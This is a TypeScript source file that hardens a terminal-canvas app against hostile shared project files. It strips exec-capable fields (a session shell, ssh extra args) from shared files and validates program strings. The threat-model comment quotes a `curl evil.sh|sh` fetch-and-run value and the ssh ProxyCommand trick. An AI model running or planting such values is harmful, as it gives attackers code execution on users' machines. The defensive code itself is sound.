/**
 * Trust boundary for the node fields that end up EXECUTING something.
 *
 * `.nodeterm/project.json` is hostile input: it is git-shared, hand-editable, auto-adopted by
 * "Open folder…", and for an SSH project it lives on the remote host. A value that arrives from
 * that file was never typed by the local user, so it must never become a command. The codebase
 * already honors this for `initialCommand` (deliberately never serialized); two siblings reach an
 * exec the same way and are handled here:
 *
 *  - `NodeState.shell` — the session program. It lands as tmux `new-session`'s trailing command
 *    argument, and tmux runs a lone command argument THROUGH A SHELL. A cloned repo could ship
 *    `"shell": "curl evil.sh|sh"`, or simply point at a script committed in the repo.
 *  - `NodeState.ssh.extraArgs` — spliced verbatim into the `ssh` argv (`buildSshArgs`), where
 *    `-o ProxyCommand=<cmd>` makes ssh run `<cmd>` LOCALLY through /bin/sh.
 *
 * Both are legitimate when the LOCAL user sets them, so they are not deleted — they are made
 * MACHINE-LOCAL: `stripSharedNodeExec` keeps them out of every project file we write, and
 * `localNodeExec` / `applyLocalNodeExec` round-trip them through the machine-local workspace.json
 * index instead (`IndexEntryV3.localExec`). A project file therefore contributes NOTHING to either
 * field: the safe fallback (default shell / no extra ssh args) is what an unrecognized or foreign
 * value degrades to.
 *
 * `safeSessionProgram` is the second layer, applied where the value BECOMES a command (pty-manager),
 * in the same idiom as `permissionModeFlag` re-validating at the interpolation site: whatever the
 * path a value took to get there (a peer canvas mutation, a stale in-memory node, a future caller),
 * a program string carrying shell metacharacters is never handed to tmux.
 */

import type { CanvasNodeState } from './types'

/** Per-node exec values the LOCAL machine typed. Persisted only in the machine-local index. */
export interface LocalNodeExec {
  /** `NodeState.shell` — a custom session program for this node. */
  shell?: string
  /** `NodeState.ssh.extraArgs` — raw advanced ssh args for this node's connection. */
  sshExtraArgs?: string
}

/** Node id → the exec values that stay on this machine. */
export type LocalNodeExecMap = Record<string, LocalNodeExec>

/**
 * A session program must be ONE program, not a command line: tmux runs a lone command argument
 * through a shell, so anything a shell would interpret is refused. Absolute paths, bare names and
 * `~`-less relative paths are fine; whitespace, quotes, `;|&$()<>` … and a leading `-` (which tmux
 * would read as an option) are not.
 */
const SAFE_PROGRAM = /^[A-Za-z0-9_./+@:=-]+$/

/**
 * Validate a session program at the point it becomes a command. Returns the program when it is
 * safe to hand to tmux/node-pty, else `undefined` — i.e. the caller falls back to the default
 * shell, which is exactly the pre-feature behavior. NEVER throws: an unrecognized value degrades
 * to the safe path, it does not block the launch.
 */
export function safeSessionProgram(shell: string | undefined): string | undefined {
  if (!shell) return undefined
  const s = shell.trim()
  if (!s || s.startsWith('-')) return undefined
  if (!SAFE_PROGRAM.test(s)) return undefined
  return s
}

/**
 * Strip every exec-enabling field from the nodes we are about to write into a SHARED project file.
 * The values survive on this machine via `localNodeExec` (below); what leaves for git/the remote
 * host carries no command of any kind.
 */
export function stripSharedNodeExec(nodes: CanvasNodeState[]): CanvasNodeState[] {
  return nodes.map((n) => {
    if (n.shell === undefined && n.ssh?.extraArgs === undefined) return n
    const out: CanvasNodeState = { ...n }
    delete out.shell
    if (out.ssh) {
      const { extraArgs: _extraArgs, ...conn } = out.ssh
      out.ssh = conn
    }
    return out
  })
}

/** Collect the machine-local exec values of these nodes (for the workspace.json index entry). */
export function localNodeExec(nodes: CanvasNodeState[]): LocalNodeExecMap | undefined {
  const map: LocalNodeExecMap = {}
  for (const n of nodes) {
    const entry: LocalNodeExec = {}
    if (n.shell) entry.shell = n.shell
    if (n.ssh?.extraArgs) entry.sshExtraArgs = n.ssh.extraArgs
    if (entry.shell || entry.sshExtraArgs) map[n.id] = entry
  }
  return Object.keys(map).length ? map : undefined
}

/**
 * Re-attach this machine's own exec values to nodes just read from a project file. Anything the
 * FILE carried in those fields is dropped first (it is not ours), so a hostile/cloned project.json
 * can only ever produce the safe default. Keyed by node id, which is stable (it is the tmux
 * session name) — a foreign file that happens to reuse an id can still only inherit a value the
 * local user typed themselves.
 */
export function applyLocalNodeExec(
  nodes: CanvasNodeState[],
  local: LocalNodeExecMap | undefined
): CanvasNodeState[] {
  return nodes.map((n) => {
    const mine = local?.[n.id]
    const out: CanvasNodeState = { ...n }
    if (mine?.shell) out.shell = mine.shell
    else delete out.shell
    if (out.ssh) {
      const { extraArgs: _extraArgs, ...conn } = out.ssh
      out.ssh = mine?.sshExtraArgs ? { ...conn, extraArgs: mine.sshExtraArgs } : conn
    }
    return out
  })
}
